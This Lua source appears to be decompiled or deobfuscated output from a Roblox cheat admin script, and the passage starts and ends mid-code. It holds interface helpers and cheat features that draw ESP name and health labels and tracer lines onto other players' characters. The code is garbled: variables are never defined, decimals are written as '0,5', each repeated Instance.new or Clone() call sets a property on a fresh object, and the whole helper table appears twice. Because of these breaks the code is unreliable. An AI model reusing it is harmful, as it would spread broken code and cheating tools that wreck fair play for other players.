            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.SetAllTrans(UI.CommandBar)
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
